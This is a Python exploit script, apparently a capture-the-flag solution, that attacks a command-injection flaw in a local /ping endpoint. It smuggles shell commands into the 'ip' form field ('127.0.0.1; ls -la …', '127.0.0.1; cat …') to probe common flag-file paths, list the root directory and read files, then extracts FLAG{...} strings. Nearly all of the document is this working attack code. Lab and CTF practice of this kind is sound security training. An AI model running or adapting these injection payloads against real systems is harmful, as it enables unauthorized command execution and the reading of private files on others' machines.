import requests
import re

base_url = "http://127.0.0.1:33159"
endpoint = "/ping"

print("[*] Exploiting command injection in /ping endpoint")
print("[*] Checking common FLAG.txt locations")

# Common flag locations to check
common_locations = [
    "/FLAG.txt",
    "/root/FLAG.txt",
    "/tmp/FLAG.txt",
    "/var/FLAG.txt",
    "/home/flag.txt",
    "/etc/FLAG.txt"
]

flag_found = False

for location in common_locations:
    print(f"\n[*] Testing location: {location}")
    
    # First check if file exists using ls
    check_payload = f"127.0.0.1; ls -la {location} 2>&1 | head -5"
    
    try:
        check_response = requests.post(
            f"{base_url}{endpoint}",
            data={"ip": check_payload},
            timeout=5
        )
        
        print(f"[+] Check response status: {check_response.status_code}")
        print(f"[+] Check response:\n{check_response.text}")
        
        # If file exists (not "No such file"), try to read it
        if "No such file" not in check_response.text and "cannot access" not in check_response.text:
            print(f"[+] File found! Attempting to read: {location}")
            
            # Read the flag file
            read_payload = f"127.0.0.1; cat {location}"
            read_response = requests.post(
                f"{base_url}{endpoint}",
                data={"ip": read_payload},
                timeout=5
            )
            
            print(f"[+] Read response:\n{read_response.text}")
            
            # Extract FLAG{...} pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', read_response.text)
            if flag_match:
                print(f"\n[!] FLAG FOUND: {flag_match.group(0)}")
                flag_found = True
                break
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Request error for location {location}: {e}")
        continue

if not flag_found:
    print("[-] Flag not found in common locations")
    print("[*] Attempting directory listing of root to find flag")
    
    # Try to list root directory to find the flag
    list_payload = "127.0.0.1; ls -la / | grep -i flag"
    
    try:
        list_response = requests.post(
            f"{base_url}{endpoint}",
            data={"ip": list_payload},
            timeout=5
        )
        
        print(f"[+] Directory listing response:\n{list_response.text}")
        
        # Extract flag filename from listing
        flag_file_match = re.search(r'(FLAG\S*)', list_response.text, re.I)
        if flag_file_match:
            flag_filename = flag_file_match.group(1)
            print(f"[+] Found flag file: {flag_filename}")
            
            # Read the flag
            read_payload = f"127.0.0.1; cat /{flag_filename}"
            flag_response = requests.post(
                f"{base_url}{endpoint}",
                data={"ip": read_payload},
                timeout=5
            )
            
            flag_match = re.search(r'FLAG\{[^}]+\}', flag_response.text)
            if flag_match:
                print(f"\n[!] FLAG FOUND: {flag_match.group(0)}")
    except Exception as e:
        print(f"[-] Error during directory listing: {e}")
